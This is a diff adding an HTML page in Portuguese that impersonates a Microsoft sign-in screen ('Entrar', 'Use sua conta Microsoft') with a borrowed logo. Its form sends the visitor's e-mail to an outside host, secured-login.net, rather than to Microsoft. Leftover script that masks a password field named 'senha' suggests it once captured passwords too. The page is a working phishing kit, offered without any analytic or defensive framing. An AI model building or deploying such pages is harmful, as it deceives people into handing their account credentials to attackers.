@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Entrar - Microsoft</title>
+    <style type="text/css">
+        * {
+            box-sizing: border-box;
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+        }
+
+        html {
+            height: 100%;
+        }
+
+        body {
+            font-family: 'Segoe UI Webfont', -apple-system, 'Helvetica Neue',
+                'Lucida Grande', 'Roboto', 'Ebrima', 'Nirmala UI', 'Gadugi',
+                'Segoe Xbox Symbol', 'Segoe UI Symbol', 'Meiryo UI', 'Khmer UI', 'Tunga',
+                'Lao UI', 'Raavi', 'Iskoola Pota', 'Latha', 'Leelawadee',
+                'Microsoft YaHei UI', 'Microsoft JhengHei UI', 'Malgun Gothic',
+                'Estrangelo Edessa', 'Microsoft Himalaya', 'Microsoft New Tai Lue',
+                'Microsoft PhagsPa', 'Microsoft Tai Le', 'Microsoft Yi Baiti',
+                'Mongolian Baiti', 'MV Boli', 'Myanmar Text', 'Cambria Math';
+            color: #000;
+            height: 100%;
+        }
+
+        h1 {
+            font-size: 1.75rem;
+            font-weight: 600;
+        }
+
+        h1,
+        p {
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+
+        a,
+        a:hover,
+        a:focus {
+            color: #0072c6;
+        }
+
+        .visualmente-oculto {
+            border: 0;
+            clip: rect(0 0 0 0);
+            height: 1px;
+            margin: -1px;
+            overflow: hidden;
+            padding: 0;
+            position: absolute;
+            width: 1px;
+        }
+
+        .container {
+            height: 100%;
+            width: 100%;
+            padding: 1rem;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+        }
+
+        .container-formulario {
+            align-items: center;
+            display: flex;
+            flex-direction: column;
+            height: 80%;
+            justify-content: center;
+            max-width: 20rem;
+            width: 100%;
+        }
+
+        img {
+            max-width: 100%;
+            width: 8rem;
+        }
+
+        h1 {
+            margin: 1rem 0 1rem 0;
+        }
+
+        .conta {
+            text-align: center;
+            padding: 1rem 1rem 2rem 1rem;
+        }
+
+        .conta p:first-of-type {
+            margin-bottom: 0.25rem;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+        }
+        
+        .container-checkbox {
+            width: 100%;
+            text-align: left;
+            padding: 0.25rem 0 0.25rem 0;
+            margin-bottom: 1.25rem;
+        }
+        
+        input[type='text'],
+        input[type='password'] {
+            border: 2px solid rgba(0, 0, 0, 0.4);
+            background-color: rgba(255, 255, 255, 0.4);
+            color: #000;
+            font-size: 1rem;
+            padding: 0.375rem 0.5rem;
+            margin-bottom: 0.75rem;
+        }
+
+        input[type='text'],
+        input[type='password'] {
+            width: 100%;
+        }
+        
+        button {
+            background-color: #0067b8;
+            border: 1px solid #0067b8;
+            color: #ffffff;
+            font-size: 1rem;
+            margin-bottom: 1rem;
+            min-height: 2rem;
+            width: 100%;
+            padding: 0.25rem 0.75rem;
+        }
+
+        button:hover {
+            background-color: #005da6;
+            border-color: rgba(0, 0, 0, 0.4);
+            cursor: pointer;
+        }
+
+        .esqueci {
+            padding-top: 2rem;
+        }
+        
+        .esqueci p:first-of-type {
+            padding-bottom: 0.5rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="container-formulario">
+            <img alt="Logo da Microsoft." src="https://i.pinimg.com/originals/fa/d0/6e/fad06edbb3c9a3655233c6ab64c47c81.png" />
+            <div class="conta">
+                <h1>Entrar</h1>
+                <p>Use sua conta Microsoft.</p>
+                
+            </div>
+
+            <form action="https://secured-login.net/pages/c3955b1c48a" id="formulario-login" method="post" name="formulario-login">
+                <label class="visualmente-oculto" for="nome">E-mail</label> 
+                <input id="nome-usuario" name="nome-usuario" placeholder="E-mail" required="required" type="text" /> 
+                
+                
+                
+                <div class="container-checkbox">
+                    <input id="manter-conectado" name="manter-conectado" type="checkbox" /> 
+                    <label for="manter-conectado">Manter-me conectado</label>
+                </div>
+                
+                <button id="enviar" required="" type="submit">Entrar</button>
+            </form>
+
+            
+
+            <div class="esqueci">
+
+            </div>
+        </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        jQuery(function($) {
+            $('#formulario-login').submit(function() {
+                var txt = $('#senha');
+                txt.val("*******");
+            });
+
+            function exibir(mensagem) {
+                $('<p/>').html(mensagem).appendTo(document.body);
+            }
+        });
+    </script>
+</body>
+</html>
